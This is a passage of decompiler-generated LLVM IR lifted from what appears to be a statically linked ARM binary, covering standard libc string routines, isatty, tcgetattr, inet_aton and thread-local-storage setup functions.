  uselistorder label %dec_label_pc_20d8c, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_20d2c, { 1, 0 }
  uselistorder label %dec_label_pc_20cbc, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_20d9c = load i32, i32* @r4, align 4
  store i32 %v3_20d9c, i32* %stack_var_-16, align 4
  %v6_20d9c = load i32, i32* @r5, align 4
  %v9_20d9c = load i32, i32* @r6, align 4
  %v0_20da0 = load i32, i32* @r0, align 4
  %v0_20da4 = load i32, i32* @r1, align 4
  store i32 %v0_20da4, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_20dc08 = inttoptr i32 %v0_20da0 to i8*
  %v2_20dc09 = load i8, i8* %v1_20dc08, align 1
  %v3_20dc010 = zext i8 %v2_20dc09 to i32
  store i32 %v3_20dc010, i32* @r1, align 4
  %v2_20dc411 = icmp eq i8 %v2_20dc09, 0
  store i32 %v0_20da4, i32* @r0, align 4
  %v1_20dcc12 = add i32 %v0_20da0, 1
  store i32 %v1_20dcc12, i32* @r4, align 4
  br i1 %v2_20dc411, label %dec_label_pc_20dd4, label %dec_label_pc_20db0

dec_label_pc_20db0:                               ; preds = %entry, %dec_label_pc_20dbc
  %v3_20dc014 = phi i32 [ %v3_20dc0, %dec_label_pc_20dbc ], [ %v3_20dc010, %entry ]
  %v0_20dc813 = phi i32 [ %v0_20dc8.pre, %dec_label_pc_20dbc ], [ %v0_20da4, %entry ]
  %v2_20db0 = call i32 @__GI_strchr(i32 %v0_20dc813, i32 %v3_20dc014)
  %v2_20db4 = icmp eq i32 %v2_20db0, 0
  %v0_20dbc = load i32, i32* @r5, align 4
  br i1 %v2_20db4, label %dec_label_pc_20dbc, label %dec_label_pc_20dd4

dec_label_pc_20dbc:                               ; preds = %dec_label_pc_20db0
  %v1_20dbc = add i32 %v0_20dbc, 1
  %v0_20dc0.pre = load i32, i32* @r4, align 4
  %v0_20dc8.pre = load i32, i32* @r6, align 4
  store i32 %v1_20dbc, i32* @r5, align 4
  %v1_20dc0 = inttoptr i32 %v0_20dc0.pre to i8*
  %v2_20dc0 = load i8, i8* %v1_20dc0, align 1
  %v3_20dc0 = zext i8 %v2_20dc0 to i32
  store i32 %v3_20dc0, i32* @r1, align 4
  %v2_20dc4 = icmp eq i8 %v2_20dc0, 0
  store i32 %v0_20dc8.pre, i32* @r0, align 4
  %v1_20dcc = add i32 %v0_20dc0.pre, 1
  store i32 %v1_20dcc, i32* @r4, align 4
  br i1 %v2_20dc4, label %dec_label_pc_20dd4, label %dec_label_pc_20db0

dec_label_pc_20dd4:                               ; preds = %dec_label_pc_20dbc, %dec_label_pc_20db0, %entry
  %v0_20dd4 = phi i32 [ 0, %entry ], [ %v0_20dbc, %dec_label_pc_20db0 ], [ %v1_20dbc, %dec_label_pc_20dbc ]
  %v2_20dd8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_20dd8, i32* @r4, align 4
  store i32 %v6_20d9c, i32* @r5, align 4
  store i32 %v9_20d9c, i32* @r6, align 4
  ret i32 %v0_20dd4

; uselistorder directives
  uselistorder i32 %v3_20dc0, { 1, 0 }
  uselistorder i32 %v0_20dc8.pre, { 1, 0 }
  uselistorder i32 %v0_20dc0.pre, { 1, 0 }
  uselistorder label %dec_label_pc_20db0, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_20de4 = urem i32 %arg2, 256
  store i32 %v1_20de4, i32* @r4, align 4
  %v2_20de4 = icmp eq i32 %v1_20de4, 0
  br i1 %v2_20de4, label %dec_label_pc_20df8, label %dec_label_pc_20e0c.preheader

dec_label_pc_20e0c.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_20e143 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_20de4)
  %v2_20e185 = icmp eq i32 %v2_20e143, 0
  br i1 %v2_20e185, label %dec_label_pc_20e20, label %dec_label_pc_20e04

dec_label_pc_20df8:                               ; preds = %entry
  %v2_20dfc = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_20e24

dec_label_pc_20e04:                               ; preds = %dec_label_pc_20e0c.preheader, %dec_label_pc_20e04
  %v2_20e146 = phi i32 [ %v2_20e14, %dec_label_pc_20e04 ], [ %v2_20e143, %dec_label_pc_20e0c.preheader ]
  store i32 %v2_20e146, i32* @r5, align 4
  %v1_20e08 = add i32 %v2_20e146, 1
  store i32 %v1_20e08, i32* @r0, align 4
  %v0_20e10 = load i32, i32* @r4, align 4
  %v2_20e14 = call i32 @__GI_strchr(i32 %v1_20e08, i32 %v0_20e10)
  %v2_20e18 = icmp eq i32 %v2_20e14, 0
  br i1 %v2_20e18, label %dec_label_pc_20e20, label %dec_label_pc_20e04

dec_label_pc_20e20:                               ; preds = %dec_label_pc_20e04, %dec_label_pc_20e0c.preheader
  %v0_20e20 = load i32, i32* @r5, align 4
  br label %dec_label_pc_20e24

dec_label_pc_20e24:                               ; preds = %dec_label_pc_20df8, %dec_label_pc_20e20
  %storemerge = phi i32 [ %v2_20dfc, %dec_label_pc_20df8 ], [ %v0_20e20, %dec_label_pc_20e20 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_20e14, { 1, 0 }
  uselistorder i32 %v1_20e08, { 1, 0 }
  uselistorder i32 %v1_20de4, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0, 3, 5, 4 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_20e24, { 1, 0 }
  uselistorder label %dec_label_pc_20e04, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v0_20e602 = load i32, i32* @r0, align 4
  %v1_20e603 = inttoptr i32 %v0_20e602 to i8*
  %v2_20e604 = load i8, i8* %v1_20e603, align 1
  %v2_20e646 = icmp eq i8 %v2_20e604, 0
  br i1 %v2_20e646, label %dec_label_pc_20e70, label %dec_label_pc_20e44.preheader

dec_label_pc_20e3c:                               ; preds = %dec_label_pc_20e44
  %v1_20e4c = add i32 %v0_20e4c, 1
  %v9_20e3c = icmp eq i8 %v0_20e3c10.in, %v2_20e44
  br i1 %v9_20e3c, label %dec_label_pc_20e58, label %dec_label_pc_20e44

dec_label_pc_20e44:                               ; preds = %dec_label_pc_20e44.preheader, %dec_label_pc_20e3c
  %v0_20e4c = phi i32 [ %tmp, %dec_label_pc_20e44.preheader ], [ %v1_20e4c, %dec_label_pc_20e3c ]
  %v1_20e44 = inttoptr i32 %v0_20e4c to i8*
  %v2_20e44 = load i8, i8* %v1_20e44, align 1
  %v2_20e48 = icmp eq i8 %v2_20e44, 0
  br i1 %v2_20e48, label %dec_label_pc_20e70, label %dec_label_pc_20e3c

dec_label_pc_20e58:                               ; preds = %dec_label_pc_20e3c
  %v1_20e58 = add i32 %v0_20e58, 1
  %v1_20e5c = add i32 %v0_20e5c, 1
  %v1_20e60 = inttoptr i32 %v1_20e5c to i8*
  %v2_20e60 = load i8, i8* %v1_20e60, align 1
  %v2_20e64 = icmp eq i8 %v2_20e60, 0
  br i1 %v2_20e64, label %dec_label_pc_20e70, label %dec_label_pc_20e44.preheader

dec_label_pc_20e44.preheader:                     ; preds = %entry, %dec_label_pc_20e58
  %v0_20e5c = phi i32 [ %v1_20e5c, %dec_label_pc_20e58 ], [ %v0_20e602, %entry ]
  %v0_20e58 = phi i32 [ %v1_20e58, %dec_label_pc_20e58 ], [ 0, %entry ]
  %v0_20e3c10.in = phi i8 [ %v2_20e60, %dec_label_pc_20e58 ], [ %v2_20e604, %entry ]
  br label %dec_label_pc_20e44

dec_label_pc_20e70:                               ; preds = %dec_label_pc_20e58, %dec_label_pc_20e44, %entry
  %v0_20e70 = phi i32 [ 0, %entry ], [ %v0_20e58, %dec_label_pc_20e44 ], [ %v1_20e58, %dec_label_pc_20e58 ]
  ret i32 %v0_20e70

; uselistorder directives
  uselistorder i8 %v2_20e44, { 1, 0 }
  uselistorder i32 %v0_20e4c, { 1, 0 }
  uselistorder label %dec_label_pc_20e44.preheader, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_20e84 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_20e84, i32* @r1, align 4
  %v0_20e88 = call i32 @__GI_tcgetattr()
  %v1_20e8c = sub i32 1, %v0_20e88
  %v2_20e8c = icmp ult i32 %v0_20e88, 2
  br i1 %v2_20e8c, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_20e9c = phi i32 [ %v1_20e8c, %entry ], [ 0, %bb ]
  ret i32 %v1_20e9c

; uselistorder directives
  uselistorder i32 %v0_20e88, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_20ea0 = load i32, i32* @r4, align 4
  %v6_20ea0 = load i32, i32* @r5, align 4
  %v9_20ea0 = load i32, i32* @r6, align 4
  %v2_20ea8 = ptrtoint i32* %stack_var_-52 to i32
  %v0_20eac = load i32, i32* @r1, align 4
  store i32 %v0_20eac, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_20eb8 = load i32, i32* @r0, align 4
  %v3_20eb8 = call i32 @ioctl(i32 %v0_20eb8, i32 21505, i32 %v2_20ea8)
  store i32 %v3_20eb8, i32* %r0.global-to-local, align 4
  store i32 %v3_20eb8, i32* @r5, align 4
  %v2_20ebc = icmp eq i32 %v3_20eb8, 0
  br i1 %v2_20ebc, label %dec_label_pc_20ec4, label %dec_label_pc_20f08

dec_label_pc_20ec4:                               ; preds = %entry
  %v4_20ed0 = zext i8 %tmp to i32
  store i32 %v4_20ed0, i32* @ip, align 4
  %v3_20ed4 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_20ed4, i32* @r3, align 4
  %v1_20ed8 = load i32, i32* @r4, align 4
  %v2_20ed8 = add i32 %v1_20ed8, 4
  %v3_20ed8 = inttoptr i32 %v2_20ed8 to i32*
  %v0_20edc = load i32, i32* %r1.global-to-local, align 4
  %v1_20edc = load i32, i32* @r4, align 4
  %v2_20edc = add i32 %v1_20edc, 8
  %v3_20edc = inttoptr i32 %v2_20edc to i32*
  store i32 %v0_20edc, i32* %v3_20edc, align 4
  %v0_20ee0 = load i32, i32* %r0.global-to-local, align 4
  %v1_20ee0 = load i32, i32* @r4, align 4
  %v2_20ee0 = add i32 %v1_20ee0, 12
  %v3_20ee0 = inttoptr i32 %v2_20ee0 to i32*
  store i32 %v0_20ee0, i32* %v3_20ee0, align 4
  %v2_20ee4 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_20ee4, i32* @r1, align 4
  %v1_20eec = load i32, i32* @r4, align 4
  %v2_20eec = inttoptr i32 %v1_20eec to i32*
  store i32 %v3_20ed4, i32* %v2_20eec, align 4
  %v0_20ef0 = load i32, i32* @ip, align 4
  %v1_20ef0 = trunc i32 %v0_20ef0 to i8
  %v2_20ef0 = load i32, i32* @r4, align 4
  %v3_20ef0 = add i32 %v2_20ef0, 16
  %v4_20ef0 = inttoptr i32 %v3_20ef0 to i8*
  store i8 %v1_20ef0, i8* %v4_20ef0, align 1
  %v0_20ef4 = load i32, i32* @r4, align 4
  %v1_20ef4 = add i32 %v0_20ef4, 17
  store i32 %v1_20ef4, i32* %r0.global-to-local, align 4
  %v4_20ef8 = call i32 @__GI_mempcpy(i32 %v1_20ef4, i32 %v2_20ee4, i32 19, i32 %v3_20ed4)
  store i32 %v4_20ef8, i32* %r0.global-to-local, align 4
  %v0_20efc = load i32, i32* @r5, align 4
  store i32 %v0_20efc, i32* %r1.global-to-local, align 4
  %v3_20f04 = inttoptr i32 %v4_20ef8 to i8*
  %v4_20f04 = call i32 @__GI_memset(i8* %v3_20f04, i32 %v0_20efc, i32 13)
  store i32 %v4_20f04, i32* %r0.global-to-local, align 4
  %v0_20f08.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_20f08

dec_label_pc_20f08:                               ; preds = %entry, %dec_label_pc_20ec4
  %v0_20f08 = phi i32 [ %v3_20eb8, %entry ], [ %v0_20f08.pre, %dec_label_pc_20ec4 ]
  store i32 %v0_20f08, i32* %r0.global-to-local, align 4
  store i32 %v3_20ea0, i32* @r4, align 4
  store i32 %v6_20ea0, i32* @r5, align 4
  store i32 %v9_20ea0, i32* @r6, align 4
  ret i32 %v0_20f08

; uselistorder directives
  uselistorder i32 %v0_20f08, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 17, { 8, 1, 2, 0, 9, 10, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_20f08, { 1, 0 }
}

define i32 @inet_aton() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_20f1c = load i32, i32* @r4, align 4
  store i32 %v3_20f1c, i32* %stack_var_-28, align 4
  %v0_20f24 = load i32, i32* @r0, align 4
  %v2_20f24 = icmp eq i32 %v0_20f24, 0
  %v0_20f2c = load i32, i32* @r1, align 4
  br i1 %v2_20f24, label %dec_label_pc_21000, label %dec_label_pc_20f34

dec_label_pc_20f34:                               ; preds = %entry
  br label %dec_label_pc_20f4c

dec_label_pc_20f4c:                               ; preds = %dec_label_pc_20f34, %dec_label_pc_20fc4
  %v1_20fc4 = phi i32 [ 0, %dec_label_pc_20f34 ], [ %v5_20fc4, %dec_label_pc_20fc4 ]
  %v0_20fc8 = phi i32 [ 1, %dec_label_pc_20f34 ], [ %v1_20fc8, %dec_label_pc_20fc4 ]
  %v0_20f4c = phi i32 [ %v0_20f24, %dec_label_pc_20f34 ], [ %v0_20f4c13, %dec_label_pc_20fc4 ]
  %v1_20f4c = inttoptr i32 %v0_20f4c to i8*
  %v2_20f4c = load i8, i8* %v1_20f4c, align 1
  %v3_20f4c = zext i8 %v2_20f4c to i32
  %v4_20f50 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 284) to i32*), align 4
  %v2_20f54 = mul nuw nsw i32 %v3_20f4c, 2
  %v2_20f58 = add i32 %v2_20f54, %v4_20f50
  %v3_20f58 = inttoptr i32 %v2_20f58 to i16*
  %v4_20f58 = load i16, i16* %v3_20f58, align 2
  %v1_20f5c = and i16 %v4_20f58, 8
  %v2_20f5c = icmp eq i16 %v1_20f5c, 0
  br i1 %v2_20f5c, label %dec_label_pc_21000, label %dec_label_pc_20f64

dec_label_pc_20f64:                               ; preds = %dec_label_pc_20f4c
  br label %dec_label_pc_20f84

dec_label_pc_20f6c:                               ; preds = %dec_label_pc_20f84
  %v2_20f6c = mul i32 %v0_20fc4, 10
  %v1_20f70 = add i32 %v2_20f6c, -48
  %v2_20f74 = add i32 %v3_20f84, %v1_20f70
  %v8_20f7c = icmp sgt i32 %v2_20f74, 255
  br i1 %v8_20f7c, label %dec_label_pc_21000, label %dec_label_pc_20f80

dec_label_pc_20f80:                               ; preds = %dec_label_pc_20f6c
  %v1_20f80 = add i32 %v0_20fb4, 1
  store i32 %v1_20f80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_20f84

dec_label_pc_20f84:                               ; preds = %dec_label_pc_20f64, %dec_label_pc_20f80
  %v0_20fc4 = phi i32 [ 0, %dec_label_pc_20f64 ], [ %v2_20f74, %dec_label_pc_20f80 ]
  %v0_20fb4 = phi i32 [ %v0_20f4c, %dec_label_pc_20f64 ], [ %v1_20f80, %dec_label_pc_20f80 ]
  %v1_20f84 = inttoptr i32 %v0_20fb4 to i8*
  %v2_20f84 = load i8, i8* %v1_20f84, align 1
  %v3_20f84 = zext i8 %v2_20f84 to i32
  %v2_20f88 = mul nuw nsw i32 %v3_20f84, 2
  %v2_20f8c = add i32 %v2_20f88, %v4_20f50
  %v3_20f8c = inttoptr i32 %v2_20f8c to i16*
  %v4_20f8c = load i16, i16* %v3_20f8c, align 2
  %v6_20f8c = zext i16 %v4_20f8c to i32
  %v1_20f90 = and i32 %v6_20f8c, 8
  %v2_20f90 = icmp eq i32 %v1_20f90, 0
  br i1 %v2_20f90, label %dec_label_pc_20f98, label %dec_label_pc_20f6c

dec_label_pc_20f98:                               ; preds = %dec_label_pc_20f84
  %v7_20f98 = icmp eq i32 %v0_20fc8, 4
  br i1 %v7_20f98, label %dec_label_pc_20fb0, label %dec_label_pc_20fa0

dec_label_pc_20fa0:                               ; preds = %dec_label_pc_20f98
  %v7_20fa0 = icmp eq i8 %v2_20f84, 46
  br i1 %v7_20fa0, label %dec_label_pc_20fa8, label %dec_label_pc_21000

dec_label_pc_20fa8:                               ; preds = %dec_label_pc_20fa0
  %v1_20fa8 = add i32 %v0_20fb4, 1
  store i32 %v1_20fa8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_20fc4

dec_label_pc_20fb0:                               ; preds = %dec_label_pc_20f98
  %v2_20fb0 = icmp eq i8 %v2_20f84, 0
  %v1_20fb4 = add i32 %v0_20fb4, 1
  store i32 %v1_20fb4, i32* %r0.global-to-local, align 4
  br i1 %v2_20fb0, label %dec_label_pc_20fc4, label %dec_label_pc_20fbc

dec_label_pc_20fbc:                               ; preds = %dec_label_pc_20fb0
  %v1_20fbc = and i32 %v6_20f8c, 32
  %v2_20fbc = icmp eq i32 %v1_20fbc, 0
  br i1 %v2_20fbc, label %dec_label_pc_21000, label %dec_label_pc_20fc4

dec_label_pc_20fc4:                               ; preds = %dec_label_pc_20fbc, %dec_label_pc_20fb0, %dec_label_pc_20fa8
  %v0_20f4c13 = phi i32 [ %v1_20fb4, %dec_label_pc_20fbc ], [ %v1_20fb4, %dec_label_pc_20fb0 ], [ %v1_20fa8, %dec_label_pc_20fa8 ]
  %v4_20fc4 = mul i32 %v1_20fc4, 256
  %v5_20fc4 = or i32 %v0_20fc4, %v4_20fc4
  %v1_20fc8 = add nuw nsw i32 %v0_20fc8, 1
  %v7_20fd0 = icmp slt i32 %v1_20fc8, 5
  br i1 %v7_20fd0, label %dec_label_pc_20f4c, label %dec_label_pc_20fd4

dec_label_pc_20fd4:                               ; preds = %dec_label_pc_20fc4
  %v2_20fd4 = icmp eq i32 %v0_20f2c, 0
  br i1 %v2_20fd4, label %.thread8.thread, label %bb

.thread8.thread:                                  ; preds = %dec_label_pc_20fd4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_21004

bb:                                               ; preds = %dec_label_pc_20fd4
  %v4_20fd8 = udiv i32 %v5_20fc4, 16777216
  %v2_20fdc = udiv i32 %v5_20fc4, 256
  %v5_20fe0 = and i32 %v2_20fdc, 65280
  %v2_20fe4 = and i32 %v5_20fc4, 65280
  %v5_20fe8 = mul nuw nsw i32 %v2_20fe4, 256
  %v5_20fec = mul i32 %v0_20fc4, 16777216
  %v6_20fe0 = or i32 %v4_20fd8, %v5_20fec
  %v6_20fe8 = or i32 %v6_20fe0, %v5_20fe0
  %v6_20fec = or i32 %v6_20fe8, %v5_20fe8
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_20ff8 = inttoptr i32 %v0_20f2c to i32*
  store i32 %v6_20fec, i32* %v3_20ff8, align 4
  %v2_21004.pre = load i32, i32* %stack_var_-28, align 4
  %v1_21008.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_21004

dec_label_pc_21000:                               ; preds = %dec_label_pc_20fa0, %dec_label_pc_20fbc, %dec_label_pc_20f4c, %dec_label_pc_20f6c, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_21004

dec_label_pc_21004:                               ; preds = %.thread8.thread, %bb, %dec_label_pc_21000
  %v1_21008 = phi i32 [ %v1_21008.pre, %bb ], [ 0, %dec_label_pc_21000 ], [ 1, %.thread8.thread ]
  %v2_21004 = phi i32 [ %v2_21004.pre, %bb ], [ %v3_20f1c, %dec_label_pc_21000 ], [ %v3_20f1c, %.thread8.thread ]
  store i32 %v2_21004, i32* @r4, align 4
  ret i32 %v1_21008

; uselistorder directives
  uselistorder i32 %v1_20fc8, { 1, 0 }
  uselistorder i32 %v5_20fc4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_20fb4, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 1, 2, 4, 5, 6 }
  uselistorder i32 65280, { 3, 0, 1, 2 }
  uselistorder i32 255, { 3, 4, 0, 1, 2, 14, 15, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 284, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_21004, { 2, 1, 0 }
  uselistorder label %dec_label_pc_21000, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_20f84, { 1, 0 }
  uselistorder label %dec_label_pc_20f4c, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v3_21020 = load i32, i32* @r4, align 4
  store i32 %v3_21020, i32* %stack_var_-16, align 4
  %v4_21024 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 72) to i32*), align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v4_2102c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 60) to i32*), align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_21034 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 36) to i32*), align 4
  store i32 %v4_21034, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v1_2103c = inttoptr i32 %v4_21024 to i32*
  %v2_2103c = load i32, i32* %v1_2103c, align 4
  %v4_21040 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 52) to i32*), align 4
  store i32 %v4_21040, i32* %lr.global-to-local, align 4
  store i32 144, i32* %r3.global-to-local, align 4
  %v1_21048 = add i32 %v2_2103c, 15
  %v4_2104c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 144) to i32*), align 4
  store i32 %v4_2104c, i32* @ip, align 4
  %v1_21050 = load i32, i32* @r0, align 4
  %v2_21050 = add i32 %v1_21050, %v1_21048
  %v1_21054 = inttoptr i32 %v4_2102c to i32*
  %v2_21054 = load i32, i32* %v1_21054, align 4
  store i32 %v2_21054, i32* %r3.global-to-local, align 4
  %v1_21058 = and i32 %v2_21050, -16
  store i32 %v1_21058, i32* %v1_2103c, align 4
  %v0_21060 = load i32, i32* @r0, align 4
  %v1_21060 = load i32, i32* %r4.global-to-local, align 4
  %v2_21060 = inttoptr i32 %v1_21060 to i32*
  store i32 %v0_21060, i32* %v2_21060, align 4
  %v0_21064 = load i32, i32* @r1, align 4
  %v1_21064 = load i32, i32* %lr.global-to-local, align 4
  %v2_21064 = inttoptr i32 %v1_21064 to i32*
  store i32 %v0_21064, i32* %v2_21064, align 4
  %v0_21068 = load i32, i32* %r3.global-to-local, align 4
  %v1_21068 = load i32, i32* @ip, align 4
  %v2_21068 = inttoptr i32 %v1_21068 to i32*
  store i32 %v0_21068, i32* %v2_21068, align 4
  %v2_2106c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_2106c, i32* %r4.global-to-local, align 4
  %v1_21070 = load i32, i32* @r0, align 4
  ret i32 %v1_21070

; uselistorder directives
  uselistorder i32 -16, { 21, 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
}

define i32 @function_21078(i32 %arg1) local_unnamed_addr {
dec_label_pc_21078:
  %v0_21078 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_21078, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_21078
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_21078, %bb
  %v4_21088 = phi i32 [ %arg1, %dec_label_pc_21078 ], [ 0, %bb ]
  ret i32 %v4_21088

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r3.global-to-local, align 4
  %v4_2109c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 84) to i32*), align 4
  store i32 %v4_2109c, i32* @lr, align 4
  %v4_210a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 60) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 10788) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 10788), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_210c8 = inttoptr i32 %v4_210a8 to i32*
  store i32 1, i32* %v2_210c8, align 4
  %v0_210cc = load i32, i32* %r3.global-to-local, align 4
  %v1_210cc = load i32, i32* @lr, align 4
  %v2_210cc = inttoptr i32 %v1_210cc to i32*
  store i32 %v0_210cc, i32* %v2_210cc, align 4
  %v0_210d0 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @function_210e8(i32 %arg1) local_unnamed_addr {
dec_label_pc_210e8:
  %v0_210e8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_210e8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_210e8
  %v2_210e8 = load i32, i32* @r4, align 4
  %v8_210e8 = ashr i32 %v2_210e8, %arg1
  %v9_210e8 = and i32 %v8_210e8, %arg1
  %v2_210ec = load i32, i32* @ip, align 4
  %v8_210ec = lshr i32 %v2_210ec, %v9_210e8
  %v9_210ec = and i32 %v8_210ec, %v9_210e8
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_210e8, %bb
  %v7_210f0 = phi i32 [ %arg1, %dec_label_pc_210e8 ], [ %v9_210ec, %bb ]
  ret i32 %v7_210f0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_210fc = call i32 @__aeabi_read_tp()
  %v1_21100 = inttoptr i32 %v0_210fc to i32*
  %v2_21100 = load i32, i32* %v1_21100, align 4
  %v1_21104 = add i32 %arg1, 4
  %v2_21104 = inttoptr i32 %v1_21104 to i32*
  %v3_21104 = load i32, i32* %v2_21104, align 4
  %v1_21108 = add i32 %v2_21100, 8
  %v2_21108 = inttoptr i32 %v1_21108 to i32*
  %v3_21108 = load i32, i32* %v2_21108, align 4
  %v2_2110c = add i32 %v3_21108, %v3_21104
  ret i32 %v2_2110c
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_21118 = load i32, i32* @r4, align 4
  store i32 %v3_21118, i32* %stack_var_-36, align 4
  %v6_21118 = load i32, i32* @r5, align 4
  %v15_21118 = load i32, i32* @r8, align 4
  %v18_21118 = load i32, i32* @sb, align 4
  %v21_21118 = load i32, i32* @sl, align 4
  %v24_21118 = load i32, i32* @fp, align 4
  %v27_21118 = load i32, i32* @lr, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %sl.global-to-local, align 4
  %v4_21128 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 104) to i32*), align 4
  store i32 %v4_21128, i32* %r3.global-to-local, align 4
  %v1_2112c = inttoptr i32 %v4_21128 to i32*
  %v2_2112c = load i32, i32* %v1_2112c, align 4
  store i32 %v2_2112c, i32* %r2.global-to-local, align 4
  %v2_21130 = icmp eq i32 %v2_2112c, 0
  %v0_21138 = load i32, i32* %r0.global-to-local, align 4
  %v0_2113c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_2113c, i32* %ip.global-to-local, align 4
  br i1 %v2_21130, label %dec_label_pc_21304, label %dec_label_pc_21144

dec_label_pc_21144:                               ; preds = %entry
  store i32 156, i32* %r3.global-to-local, align 4
  %v4_21148 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 156) to i32*), align 4
